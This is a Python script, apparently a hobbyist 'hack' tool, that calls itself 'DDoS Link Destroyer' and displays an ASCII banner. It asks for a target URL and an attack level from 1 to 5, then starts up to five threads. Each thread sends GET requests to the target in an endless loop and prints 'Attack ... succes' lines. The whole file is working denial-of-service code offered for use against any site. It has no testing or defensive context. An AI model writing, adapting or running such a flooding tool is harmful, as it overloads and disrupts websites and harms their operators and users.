import requests
from threading import Thread
import os
from time import sleep

os.system("clear")
print("[==]============================[==]=====[ MOTIVATION ]======[==]")
print("                                [==]                             ")
print("          Created by Perl.      [==] Code only on Linux!         ")
print("                                [==] Have a nice Hack ;)         ")
print("[=========[ DESCRIPTION ]==========]                             ")
print("                                [==]====[==]=====[==]========[==]")
print("                                                                 ")
print("      Name: DDoS Link Destroyer          #@@@@#                  ")
print("      Version: 1.3                      @WWWWWWW@*               ")
print("                                       @WWWWWWWWW                ")
print("                                        WWWWWWWW@                ")
print("                                          @WWWW@*                ")
print("      What you need?                  #=##W@@@#@@@@@@=           ")
print("                                     #@@@@@@@@@@@@@@@@##         ")
print("      1)Target Link                  @##*****=*+++*==#@#@#       ")
print("                                   ##*+++++++++++++++@@@#        ")
print("                                  ##@@++++Eternal+++*@@@@#       ")
print("                                 @@@@@*++Destroyers+#=#@@        ")
print("                                 @@@@@@*+*******=**=#@@@@        ")
print("                                  @@@@@#*==##@#####==@@@@        ")
print("                                      @####@@@@@@@@@####         ")
print("                                                                 ")
print("[==]============================[==]=========================[==]")

url = input("[?]Enter Url:>>> ")

islemler = """ 
[==]=============================================[==]
     And so choose the amount of timeout [max:5]
[==]=============================================[==]
"""

print(islemler)

thread = input("[?][Enter attack number]:> ")

if thread == "1":

    def islem1():
        while True:

            bomb = requests.get(url)
            sonuc = bomb.status_code
            yazi = "[1 Level][*][Attack to {} succes [=]:> {} <:]".format(url,sonuc)
            print(yazi)

    t1 = Thread(target=islem1)
    t1.start()



elif thread == "2":

    def islem2():
        while True:

            bomb = requests.get(url)
            sonuc = bomb.status_code
            yazi = "[2 Level][*][Attack to {} succes [=]:> {} <:]".format(url,sonuc)
            print(yazi)

    t1 = Thread(target=islem2)
    t1.start()
    t2 = Thread(target=islem2)
    t2.start()


elif thread == "3":

    def islem3():
        while True:

            bomb = requests.get(url)
            sonuc = bomb.status_code
            yazi = "[3 Level][*][Attack to {} succes [=]:> {} <:]".format(url,sonuc)
            print(yazi)

    t1 = Thread(target=islem3)
    t1.start()
    t2 = Thread(target=islem3)
    t2.start()
    t3 = Thread(target=islem3)
    t3.start()

elif thread == "4":

    def islem4():
        while True:

            bomb = requests.get(url)
            sonuc = bomb.status_code
            yazi = "[4 Level][*][Attack to {} succes [=]:> {} <:]".format(url,sonuc)
            print(yazi)

    t1 = Thread(target=islem4)
    t1.start()
    t2 = Thread(target=islem4)
    t2.start()
    t3 = Thread(target=islem4)
    t3.start()
    t4 = Thread(target=islem4)
    t4.start()

elif thread == "5":

    def islem5():
        while True:

            bomb = requests.get(url)
            sonuc = bomb.status_code
            yazi = "[5 Level][*][Attack to {} succes [=]:> {} <:]".format(url,sonuc)
            print(yazi)

    t1 = Thread(target=islem5)
    t1.start()
    t2 = Thread(target=islem5)
    t2.start()
    t3 = Thread(target=islem5)
    t3.start()
    t4 = Thread(target=islem5)
    t4.start()
    t5 = Thread(target=islem5)
    t5.start()